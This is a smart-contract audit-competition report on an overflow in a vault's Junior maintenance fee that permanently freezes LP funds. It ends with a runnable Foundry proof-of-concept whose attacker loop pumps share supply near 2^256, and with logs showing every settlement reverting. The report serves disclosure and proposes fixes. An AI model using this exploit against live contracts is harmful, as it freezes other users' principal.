# \#99075 [SC-Critical] Junior maintenance fee overflows `accruedTotalSupply()` once Junior supply is near 2^256, so every `settleLpEpoch` reverts forever and the owner cannot turn the fee off

**Submitted on Nov 11th 2026 at 18:46:12 UTC by @Web3Vinay for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99075
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Permanent freezing of funds

## Description

### Brief/Intro

The Junior maintenance fee is charged by minting new Junior shares every hour. Neither the view `accruedTotalSupply()` nor the fee mint checks whether `rawSupply + feeShares` still fits in a `uint256`. If Junior supply is already close to `type(uint256).max`, a few hours of fee push the sum past 2^256 and both revert with Panic(0x11).

The dust-NAV supply pump (separate report: *junior-dust-supply-pump-settle-overflow*) puts supply there for 268.93 USDG. After that, any nonzero fee causes the following:
- Every LP settlement reverts, because each one reads `accruedTotalSupply()` first.
- The owner cannot switch the fee off, because finalizing a new fee config mints the old fee first, and that mint overflows.

No in-protocol path recovers from this state.

### Vulnerability Details

**1. The fee is added to supply with no headroom check.**

```solidity
// TrancheVault.sol:354-359
function accruedTotalSupply() public view returns (uint256 rawAndPendingSupply) {
    rawAndPendingSupply = totalSupply();
    if (!IS_SENIOR) {
@>      rawAndPendingSupply += pendingMaintenanceFeeShares();   // Panic 0x11 when raw + pending > 2^256-1
    }
}

// TrancheVault.sol:436-442 (_checkpointMaintenanceFee)
uint256 feeShares = JuniorMaintenanceFeeMathLib.pendingFeeShares(rawSupply, maintenanceFeeAprBps, chargeableHours);
maintenanceFeeCheckpointBoundary = currentBoundary;
if (feeShares != 0) {
@>  super._update(address(0), maintenanceFeeRecipient, feeShares);   // totalSupply += feeShares -> Panic
}
```

`pendingFeeShares` is proportional to raw supply and grows every completed hour. At 1000 bps, any raw supply above about 99.9989 % of max overflows after 1 hour. At 10,000 bps the limit is 36.8 % of max after one year.

**2. Every settlement reads this value first.** `settleLpEpoch` calls `_reconcile` (`HousePool.sol:835`). That reaches `_currentPendingAccountingState`, then `_juniorShareSupply()` (`HousePool.sol:1815`), then `accruedTotalSupply()` (`HousePool.sol:1717`). The revert happens before the weekend (oracle-frozen) deferral logic, so weekends give no relief.

**3. The fee cannot be disabled.** `finalizeMaintenanceFeeConfig` checkpoints the old rate before it applies the new one:

```solidity
// TrancheVault.sol:389-391
if (previousAprBps != 0) {
@>  _checkpointMaintenanceFee();   // overflowing mint -> finalize reverts
}
```

Supply also cannot be reduced, because every burn goes through `_update`, which checkpoints first (`TrancheVault.sol:319-321`). The vault addresses in `HousePool` are set-once (`HousePool.sol:286-296`).

**Preconditions:**
- Junior is at dust NAV (> 0) after an honest loss, with Senior at its HWM. The attacker then pumps supply to ~99.98 % of max: 14 permissionless deposit/settle/claim cycles, 42 h, 268.93 USDG (all paid to Senior as coupon).
- The Junior fee is nonzero, either during the pump or enabled later. Enabling it is an ordinary owner setting (≤ 10,000 bps, default 0). The PoC enables 1000 bps through the real 72 h timelock *after* the pump.

### Impact Details

- **All LP principal is permanently frozen.** In the PoC, 751,316.53 USDG of Senior principal is frozen; in production it can be up to the Senior cap. These Senior LPs have no Junior exposure. No Senior or Junior redemption or deposit can ever settle again.
- **Broken views.** `seniorVault.totalAssets()` reverts, and so does `seniorVault.requestDeposit`.
- **No recovery:**
  - The fee cannot be set to 0 (`TrancheVault.sol:389-391`).
  - The vaults cannot be replaced (`HousePool.sol:286-296`).
  - `assignUnassignedAssets` reconciles first (`HousePool.sol:671`).
- **Cost:** 268.93 USDG plus gas. The attacker gains nothing; this is griefing.
- Trader opens still work, so the damage is limited to LP capital.

**How this differs from the dust-supply pump report:** that report needs an honest Junior deposit to trigger the overflow, exits still clear on weekends, and it ends once Junior NAV grows. This bug needs no deposit, also blocks weekends, and never ends. The pump is the same, so the NAV floor fix in that report also prevents this one; the fee-path fixes below are needed independently of it.

### Mitigation

- Root cause (shared with the dust-supply report): treat Junior NAV per share below a floor like NAV == 0, so supply cannot be pumped near 2^256.
- Fee path:
  - Cap the mint at the remaining headroom: `feeShares = min(feeShares, type(uint256).max - rawSupply - VIRTUAL_SHARES)`.
  - Use a saturating add in `accruedTotalSupply()`.
  - Let `finalizeMaintenanceFeeConfig` skip (forgive) a checkpoint that cannot be minted, so the owner can always turn the fee off.

### References

- `packages/perps/src/TrancheVault.sol:354-359`: `accruedTotalSupply()`, unchecked headroom
- `packages/perps/src/TrancheVault.sol:436-442`: fee mint in `_checkpointMaintenanceFee`
- `packages/perps/src/TrancheVault.sol:389-391`: finalize checkpoints the old fee first
- `packages/perps/src/TrancheVault.sol:319-321`: every mint/burn checkpoints the fee first
- `packages/perps/src/HousePool.sol:835`: `_reconcile` at the start of every settle
- `packages/perps/src/HousePool.sol:1717`, `:1815`: settle reads `accruedTotalSupply()`
- `packages/perps/src/HousePool.sol:286-296`: vault addresses are set-once

## Proof of Concept

## Proof of Concept

Save as `packages/perps/test/perps/JuniorFeeSupplyOverflowPermanentFreeze.t.sol` and run:

```
forge test --root packages/perps --match-path test/perps/JuniorFeeSupplyOverflowPermanentFreeze.t.sol -vv
```

The test uses only the repo's `BasePerpTest` fixture (router-pranked marks, as in the existing tests).

1. `_wipeToDust()`: an honest SHORT realizes a loss of about the full Junior NAV, leaving J = 22.54 USDG with S == HWM.
2. `_pump()`: 14 cycles of deposit, settle at dust NAV, then claim. The last deposit is sized so supply lands at max − 2e-4·max.
3. The owner enables a 1000 bps Junior fee through the 72 h timelock. After 19 h, `accruedTotalSupply()` reverts.
4. 168 hourly settles (one week, weekend included) all revert, and the Senior exit is never funded.
5. The owner proposes fee 0. After 72 h, `finalizeMaintenanceFeeConfig()` reverts with Panic(0x11).

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {console2} from "forge-std/console2.sol";

/// Place at packages/perps/test/perps/JuniorFeeSupplyOverflowPermanentFreeze.t.sol and run:
///   forge test --root packages/perps --match-path test/perps/JuniorFeeSupplyOverflowPermanentFreeze.t.sol -vv
/// Variant of the dust-NAV supply pump with the Junior maintenance fee enabled: once raw supply is within the
/// pending-fee headroom of 2^256, accruedTotalSupply() overflows. Every settle, every Junior mint/burn and the fee
/// finalize (which checkpoints first) revert permanently - no honest deposit is needed and weekends do not help.
/// Junior share supply can be pumped geometrically while Junior NAV sits at dust (post-loss, Senior at HWM).
/// Each cycle: deposit d at Junior NAV x (dust) -> mints d*(N+1000)/(x+1) shares; the Senior coupon then drains d.
/// Once supply is near 2^256, every Junior deposit activation overflows and reverts the whole settleLpEpoch.
contract JuniorFeeSupplyOverflowPermanentFreezeTest is BasePerpTest {

    address JA = address(0x1A1);
    address SA = address(0x5A1);
    address T = address(0x7A1);
    address T2 = address(0x7A2);
    address ATK = address(0xA77);
    address H = address(0x4A1);

    uint256 constant YEAR = 365 days;
    uint256 constant TARGET = type(uint256).max - type(uint256).max / 5000; // 99.98 %
    address constant FEE_R = address(0xFEE1);
    uint256 constant FEE_APR_BPS = 1000; // 10 % nominal APR, cap is 10_000

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        _fundJunior(JA, 250_000e6);
        _fundSenior(SA, 750_000e6);
    }

    function _markAt(
        uint256 px,
        uint256 ts
    ) internal {
        if (ts <= engine.lastMarkTime()) {
            ts = uint256(engine.lastMarkTime()) + 1;
        }
        if (vm.getBlockTimestamp() < ts) {
            vm.warp(ts);
        }
        vm.prank(address(router));
        engine.updateMarkPrice(px, SafeCast.toUint64(vm.getBlockTimestamp()));
    }

    function _mark(
        uint256 px
    ) internal {
        _markAt(px, vm.getBlockTimestamp() + 1);
    }

    function _projJ() internal view returns (uint256 j) {
        (, j) = pool.getPendingDepositTrancheState();
    }

    function _due(
        uint256 s,
        uint256 dt
    ) internal view returns (uint256) {
        return (s * pool.seniorRateBps() * dt) / (10_000 * YEAR);
    }

    function settleExt() external returns (IHousePool.LpEpochSettlementResult memory) {
        return _settleLpEpochForTest();
    }

    // ---------------- honest junior loss leaving dust ----------------
    function _lossSequence(
        uint256 units
    ) internal {
        _mark(1.7e8);
        if (units > 0) {
            _close(T, CfdTypes.Side.SHORT, units * 100e18, 1.7e8);
        }
        _mark(1e8);
        if (units < 4000) {
            _close(T, CfdTypes.Side.SHORT, (4000 - units) * 100e18, 1e8);
        }
    }

    function _wipeToDust() internal returns (uint256 units) {
        vm.warp(vm.getBlockTimestamp() + 2 hours);
        _fundTrader(T, 600_000e6);
        _mark(1e8);
        _open(T, CfdTypes.Side.SHORT, 400_000e18, 300_000e6, 1e8);
        // binary search the largest realized-loss chunk count that leaves Junior > 0
        uint256 lo = 0;
        uint256 hi = 4000;
        while (lo < hi) {
            uint256 mid = (lo + hi + 1) / 2;
            uint256 snap = vm.snapshotState();
            _lossSequence(mid);
            uint256 j = _projJ();
            vm.revertToStateAndDelete(snap);
            if (j > 0) {
                lo = mid;
            } else {
                hi = mid - 1;
            }
        }
        units = lo;
        _lossSequence(units);
        // a small senior exit gives the settle progress so the loss is reconciled into stored principal
        vm.prank(SA);
        seniorVault.requestRedeem(1e9, SA, SA);
        _markAt(1e8, vm.getBlockTimestamp() + 2 hours);
        require(_projJ() > 0, "dust gone");
        _settleLpEpochForTest();
    }

    // ---------------- attacker supply pump ----------------
    function _pump() internal returns (uint256 cycles, uint256 spent) {

        settlementToken.mint(ATK, 1_000_000e6);
        vm.prank(ATK);
        settlementToken.approve(address(juniorVault), type(uint256).max);
        uint256 rate = pool.seniorRateBps();
        while (juniorVault.totalSupply() < TARGET / 2) {
            uint256 J = pool.juniorPrincipal();
            uint256 S = pool.seniorPrincipal();
            uint256 t0 = pool.lastSeniorCouponCheckpointTime();
            uint256 N = juniorVault.accruedTotalSupply(); // pricing supply incl. pending fee
            require(J > 0 && S == pool.seniorHighWaterMark(), "precondition");
            // smallest reachable junior NAV x at the next settle: largest dt with coupon < J
            uint256 dtMax = (J * 10_000 * YEAR - 1) / (S * rate);
            uint256 d = _due(S, 3 hours);
            if (d < 1e6) d = 1e6;
            uint256 x = J - _due(S, dtMax);
            uint256 dt = dtMax;
            uint256 dBound = Math.mulDiv(TARGET - N, x + 1, N + 1000);
            if (d > dBound) {
                // final cycle: 1 USDG, raise x so supply lands at ~TARGET
                d = 1e6;
                uint256 xT = Math.mulDiv(d, N + 1000, TARGET - N) + 1;
                dt = ((J - xT) * 10_000 * YEAR) / (S * rate);
                x = J - _due(S, dt);
                // x moves ~1.9k atoms per second of coupon; fine-tune with the deposit size instead (1 atom of d
                // ~ 1e-6 of max supply)
                uint256 dFine = Math.mulDiv(TARGET - N, x + 1, N + 1000);
                if (dFine >= 1e6) d = dFine;
            }
            vm.prank(ATK);
            uint256 reqId = juniorVault.requestDeposit(d, ATK, ATK);
            uint256 tSettle = t0 + dt;
            require(tSettle >= juniorVault.depositEpochStart(reqId), "settle before maturity");
            _markAt(1e8, tSettle);
            require(!engine.isOracleFrozen(), "frozen");
            uint256 pj = _projJ();
            require(pj == x, "x model");
            _settleLpEpochForTest();
            uint256 claimable = juniorVault.claimableDepositRequest(reqId, ATK);
            require(claimable == d, "not activated");
            vm.prank(ATK);
            juniorVault.claimDeposit(reqId, claimable, ATK, ATK);
            spent += d;
            cycles++;
            console2.log("cycle", cycles);
            console2.log("  junior NAV at activation x (atoms)", x);
            console2.log("  deposit d (atoms)", d);
            console2.log("  junior supply after", juniorVault.totalSupply());
        }
    }

    function openProbe() external {
        _open(T2, CfdTypes.Side.LONG, 100_000e18, 20_000e6, 1e8);
    }

    function settleSeniorProbe() external view returns (uint256) {
        return seniorVault.totalAssets();
    }

    function test_N06_feeOverflowPermanentFreeze() public {
        _wipeToDust();
        assertEq(pool.seniorPrincipal(), pool.seniorHighWaterMark(), "senior unimpaired");
        assertGt(pool.juniorPrincipal(), 0, "junior dust > 0");
        uint256 t0 = vm.getBlockTimestamp();
        (uint256 cycles, uint256 spent) = _pump();
        console2.log("pump cycles", cycles);
        console2.log("attacker USDG spent (moved to senior as coupon)", spent);
        console2.log("hours elapsed", (vm.getBlockTimestamp() - t0) / 3600);
        uint256 N = juniorVault.totalSupply();
        console2.log("raw junior supply", N);
        console2.log("headroom to 2^256 (units of 1e-7 of max)", Math.mulDiv(type(uint256).max - N, 10_000_000, type(uint256).max));

        // the pool owner enables an ordinary 10 % Junior maintenance fee through the real 72 h timelock
        juniorVault.proposeMaintenanceFeeConfig(FEE_APR_BPS, FEE_R);
        vm.warp(juniorVault.maintenanceFeeConfigActivationTime());
        juniorVault.finalizeMaintenanceFeeConfig();
        console2.log("fee apr bps", juniorVault.maintenanceFeeAprBps());
        console2.log("pending fee shares now", juniorVault.pendingMaintenanceFeeShares());

        // a Senior LP (no Junior involvement) asks to exit 10 %
        uint256 sShares = seniorVault.maxRequestRedeem(SA) / 10;
        vm.prank(SA);
        seniorVault.requestRedeem(sShares, SA, SA);
        uint256 seniorVaultBal0 = settlementToken.balanceOf(address(seniorVault));
        uint256 seniorPrincipal0 = pool.seniorPrincipal();

        // just let time pass; nobody deposits
        uint256 hoursToOverflow;
        for (uint256 h = 1; h <= 200; h++) {
            vm.warp(vm.getBlockTimestamp() + 1 hours);
            try juniorVault.accruedTotalSupply() returns (uint256) {}
            catch {
                hoursToOverflow = h;
                break;
            }
        }
        assertGt(hoursToOverflow, 0, "accrued supply overflowed");
        console2.log("hours after fee finalize until accruedTotalSupply() reverts", hoursToOverflow);

        // every settle reverts, weekday AND weekend, for a full week
        uint256 attempts;
        uint256 reverts;
        uint256 frozenAttempts;
        bytes memory lastErr;
        for (uint256 h = 0; h < 168; h++) {
            vm.warp(vm.getBlockTimestamp() + 1 hours);
            if (!engine.isOracleFrozen()) {
                vm.prank(address(router));
                try engine.updateMarkPrice(1e8, SafeCast.toUint64(vm.getBlockTimestamp())) {} catch {}
            } else {
                frozenAttempts++;
            }
            attempts++;
            try this.settleExt() {}
            catch (bytes memory e) {
                reverts++;
                lastErr = e;
            }
        }
        console2.log("settle attempts over 7 days", attempts);
        console2.log("  of which in oracle-frozen weekend window", frozenAttempts);
        console2.log("  reverted", reverts);
        console2.logBytes(lastErr);
        assertEq(reverts, attempts, "every settle reverts");
        assertGt(frozenAttempts, 0, "weekend covered");
        assertEq(settlementToken.balanceOf(address(seniorVault)), seniorVaultBal0, "senior exit never funded");
        assertEq(pool.seniorPrincipal(), seniorPrincipal0, "senior principal stuck in pool");

        // views used by integrators/UIs revert too
        try this.settleSeniorProbe() returns (uint256 a) {
            console2.log("senior totalAssets still readable", a);
        } catch {
            console2.log("senior totalAssets() reverts");
        }

        // probes (informational): trading and a fresh senior deposit request
        vm.warp(vm.getBlockTimestamp() + 48 hours);
        if (engine.isOracleFrozen()) vm.warp(vm.getBlockTimestamp() + 48 hours);
        _mark(1e8);
        _fundTrader(T2, 100_000e6);
        try this.openProbe() {
            console2.log("probe: trader open still works");
        } catch {
            console2.log("probe: trader open reverts");
        }
        settlementToken.mint(H, 10_000e6);
        vm.startPrank(H);
        settlementToken.approve(address(seniorVault), 10_000e6);
        try seniorVault.requestDeposit(10_000e6, H, H) {
            console2.log("probe: senior requestDeposit accepted (will never activate)");
        } catch {
            console2.log("probe: senior requestDeposit reverts");
        }
        vm.stopPrank();

        // owner tries to switch the fee off: finalize checkpoints the old rate first -> mint overflows
        juniorVault.proposeMaintenanceFeeConfig(0, address(0));
        vm.warp(juniorVault.maintenanceFeeConfigActivationTime());
        vm.expectRevert(abi.encodeWithSelector(bytes4(0x4e487b71), uint256(0x11)));
        juniorVault.finalizeMaintenanceFeeConfig();
        console2.log("owner cannot disable the fee: finalize reverts Panic(0x11)");
        console2.log("senior principal frozen (USDG atoms)", seniorPrincipal0);
    }
}
```

### Result

```
[PASS] test_N06_feeOverflowPermanentFreeze() (gas: 30286420)
Logs:
  pump cycles 14
  attacker USDG spent (moved to senior as coupon) 268929184
  hours elapsed 42
  raw junior supply 115768920902372507593588938925589146337134077892239753182376052733612921597247
  headroom to 2^256 (units of 1e-7 of max) 2000
  fee apr bps 1000
  pending fee shares now 0
  hours after fee finalize until accruedTotalSupply() reverts 19
  settle attempts over 7 days 168
    of which in oracle-frozen weekend window 48
    reverted 168
  0x4e487b710000000000000000000000000000000000000000000000000000000000000011
  senior totalAssets() reverts
  probe: trader open still works
  probe: senior requestDeposit reverts
  owner cannot disable the fee: finalize reverts Panic(0x11)
  senior principal frozen (USDG atoms) 751316531283
```

